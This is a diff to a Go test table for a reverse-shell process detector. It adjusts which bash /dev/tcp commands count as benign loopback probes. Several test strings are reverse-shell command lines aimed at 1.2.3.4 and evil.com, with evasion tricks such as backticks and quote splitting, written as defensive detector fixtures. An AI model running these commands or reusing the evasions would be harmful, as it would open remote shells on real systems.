@@ -135,7 +135,12 @@ func TestDetectReverseShells(t *testing.T) {
 		{name: "port from backticks", processes: []Process{{PID: 1, User: "1000", Command: "bash -c exec 3<>/dev/tcp/1.2.3.4/`echo 4444`"}}, wantCount: 1},
 		{name: "empty-quote concatenation", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/1.2.3.4''/4444`}}, wantCount: 1},
 		{name: "service-name port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/evil.com/https`}}, wantCount: 1},
-		{name: "loopback host but variable port is not a literal probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost/$P`}}, wantCount: 1},
+		// A literal loopback host with a variable port is a local probe: the
+		// port can't change the host (review of #859).
+		{name: "loopback host with variable port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost/$P`}}, wantCount: 0},
+		{name: "wait-for-port loop with $PORT", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until echo > /dev/tcp/localhost/$PORT; do sleep 1; done`}}, wantCount: 0},
+		{name: "wait-for-port with default expansion", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until (</dev/tcp/127.0.0.1/${PORT:-8080}) 2>/dev/null; do sleep 1; done`}}, wantCount: 0},
+		{name: "variable host is still checked", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/$H/$P`}}, wantCount: 1},
 		{name: "loopback shorthand 127.1 probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/127.1/8080`}}, wantCount: 0},
 		{name: "quoted loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/"localhost"/5432`}}, wantCount: 0},
 		{name: "grep for /dev/tcp/ in single quotes", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn '/dev/tcp/' docs`}}, wantCount: 0},
